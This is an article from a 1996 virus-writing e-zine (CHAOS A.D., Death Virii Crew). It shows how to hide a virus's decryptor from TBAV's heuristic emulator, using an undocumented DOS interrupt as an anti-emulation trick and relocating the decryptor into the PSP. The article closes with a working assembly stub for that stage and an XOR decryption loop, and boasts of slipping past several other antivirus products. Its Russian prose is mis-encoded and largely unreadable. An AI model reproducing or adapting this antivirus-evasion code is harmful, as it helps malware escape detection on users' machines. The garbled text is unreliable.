   ; [Death Virii Crew] Presents
   ; CHAOS A.D. Vmag, Issue 2, Summer 1996                           file 009
   ;
   ;
   ; ...ª ª ‚ë ¤ã¬ ¥â¥ - á«®¢® "§¢®®ª" ¡®«ìè¥ ®â®á¨âáï ª á«®¢ã
   ;  "§¢®¨âì" ¨«¨ ª £« £®«ã  "§ ¥¡ë¢ âì"? ...(c) Ÿ ƒà¨
   ;
   ;  Š ª ¢ë ¤ã¬ ¥â¥, ª ç¥¬ã ¡®«ìè¥ ®â®á¨âáï TBAV ?
   ;
   ;
   ;
   ;                         Š ª ¯®¨¬¥âì TBAV.
   ;
   ;
   ;
   ;   *®¤ã¬ «®áì,   ¢®§¬®¦® «¨  ¯¨á âì ¢¨àãá, çâ®¡ë TBAV
   ;     ¥£® ¥ § àã£ «áï ? ……. ‚®§¬®¦® ¨ ®ç¥ì ¯à®áâ®.
   ;   ‚¯à®ç¥¬, ¯® ¯®àï¤ªã.
   ;
   ;   Ÿ áâ®«ªã«áï á ¯à®¡«¥¬®©, çâ® ª ª®© ¡ë  ¢®à®ç ®©
   ;   ¯à®æ¥¤ãà  ¤¥è¨äà®¢ª¨ ¥ ¡ë«  - TBAV   ¥¥ ¥¯à¥¬¥®
   ;   § àã£ ¥âáï, ¤ ¦¥ (¨ â¥¬ ¡®«¥¥) ¥á«¨ à §ªà¨¯â®¢ âì ¥
   ;   ¬®¦¥â (‚ á¨«ã  â¨í¢à¨áâ¨ª¨). Š § «®áì ¡ë - ¢á¥, ¤ «ìè¥
   ;   ¨¤â¨ ¥ªã¤ . H®, ¥á«¨ ¯à®æ¥¤ãàã à §ªà¨¯â®¢ª¨ ¯¥à¥¬¥é ¥¬
   ;   ¢ ¯ ¬ïâì, ¥ ®â®áïéãîáï ª ¯à®£¥ ¨ â ¬ ¥¥ ¢ë¯®«ï¥¬ - â®
   ;   ¤«ï ¥ª®â®àëå £à ¦¤   áâã¯ ¥â ®¡«®¬. ‚ ç áâ®áâ¨ WEB
   ;   ª ¦¥âáï ¢®®¡é¥ ¥ ¢ á®áâ®ï¨¨ í¬ã«¨âì £¤¥-«¨¡® ¯®¬¨¬®
   ;   ª®¤  ¯à®£¨. „«ï COM íâ® PSP:100h ¨ ¤ «¥¥ (ª®¤ ¯à®£¨).
   ;   H® ¤«ï TBAV'a â ª¨¥ ¢¥é¨ ¯à®áâ® â ª ¥ ¯à®å®¤ïâ, ®
   ;   í¬ã«¨â íâ®. Ž ¢ë¯®«ï¥â ¯à®æ¥¤ãàã à §ªà¨¯â®¢ª¨ ¨
   ;   ¡« £®¯®«ãç® ¯®¯ ¤ ¥â ¢ ¢¨àãá, £¤¥ ¢ª«îç ¥â   «¨§ â®à
   ;   ¨ ãá¯¥è® á¨£ «¨§¨àã¥â ®¡ íâ®¬ äà §®© "might be infected
   ;   by an unknown virus". H®, ® ¥ § àã£ ¥âáï, ¯à® ¥ªãî,
   ;   â® ¥áâì  èã, ¯à®æ¥¤ãàã à §ªà¨¯â®¢ª¨. Ž ®¡ íâ®¬ ¯à®áâ®
   ;   ¯à®¬®«ç¨â. ‚¨¤¨¬® ¤ã¬ ¥â, à § íâ  ¯à®æ¥¤ãà  «¥¦¨â ¥ ¢
   ;   áä¥à¥  è¥© ¯à®£à ¬¬ë, â® ®  ª ¥© ¨ ¥ ®â®á¨âáï.
   ;   ‡ ç¨â ¨ ªà¨ç âì á®¡áâ¢¥® ¥§ ç¥¬. ‚®â âãâ â® ¬ë ¨
   ;   ¢ª«îç¨¬ ¢ íâã ¯à®æ¥¤ãàã ¥ª¨©  â¨í¢à¨áâ¨ç¥áª¨© ª®¤.
   ;   ‘ª ¦¥¬ ¢ë§®¢ «¥¢®£® ¯à¥àë¢ ¨ï. ‘ª ¦¥¬ íâ® ¡ã¤¥â ª ª®¥-
   ;   ¨¡ã¤ì ¤®ªã¬¥â¨à®¢ ®¥, ¨¡® ¥áâì âã¯ ï ¯à¨¢ëçª  ã
   ;   TBAV'a ªà¨ç âì   ¢ë§®¢ë ¥¤®ªã¬¥â¨à®¢ ëå äãªæ¨©.
   ;   ‘ª ¦¥¬ íâ® ¡ã¤¥â mov ax,0d07h/int 21h. ‚ al ¯®á«¥ íâ®©
   ;   ¢á¥© ¥àã¤ë ¬ë ã¢¨¤¨¬ 0FFh, € TBAV - ¥â. ‚®â ¨ ¢á¥.
   ;   H¨ ®¤®£® ¢ëáâ ¢«¥®£® ä« £  - ¨ç¥£®. *®«ë© â®àç.
   ;   —¥£® á®¡áâ¢¥® ¨ ¡ë«® ã¦®. H¥ áâ®¨â £®¢®à¨âì ® â®¬,
   ;   çâ® DrWeb,AVP,F-Prot ®âá¥ï«¨áì ¥é¥ à ìè¥. ‚á¥ ¬®«ç â,
   ;   â¨è¨ . ˆ â®«ìª® ¢¨àãá ¤¥« ¥â á¢®¥ ¤¥«®. ;)))
   ;   ‘ª ¦¥¬, íâ® ¬®¦¥â ¡ëâì â ª:

   .model tiny
   .code
   org 100h
   start:
   ;=================== ‘â ¤¨ï ¯¥à¢ ï - €â¨í¢à¨áâ¨ª . ===============
   mov ax,0d07h
   int 21h
   xor ah,ah  ;ax = 0ffh
   sub al,1fh ;‚®â âãâ ax = 0e0h,
              ; íâ® § ¥¬ ¬ë. Hã   ®âªã¤  TBAV'ã ®¡ íâ®¬ § âì ? ;))

   ;========= ‘â ¤¨ï ¢â®à ï - *¥à¥¬¥é¥¨¥ ¯à®æ¥¤ãàë ¤¥è¨äà®¢ª¨. ======
   lea si,decrypt
   mov di,ax   ; Œ®¦® ¡ë«® ¡ë ¯à¨ª «ë¢ âìáï  ¤ si,  ¤¥¦¥© ¡ë«® ¡ë ;)
   push di    ; 0e0h
   mov cx,len_decrypt
   cld
   rep movsb
   ret        ; to psp:0e0h

   ;========= ‘â ¤¨ï âà¥âìï - *à¨¬¨â¨¢ ï ¯à®æ¥¤ãà  ¤¥è¨äà®¢ª¨. =======
   decrypt:
   lea si,begin
   mov di,si
   push di
   mov cx,cryp
   mov bx,0
   _kod equ $-2
   beg:
   lodsw
   xor ax,bx
   stosw
   loop beg
   ret
   len_decrypt equ $-decrypt

   ;===========  ç «® ¢¨àãá  =========
   _begin equ $-start
   begin:
   end start
   ;...
   ;                                                      (c) Reminder [DVC]
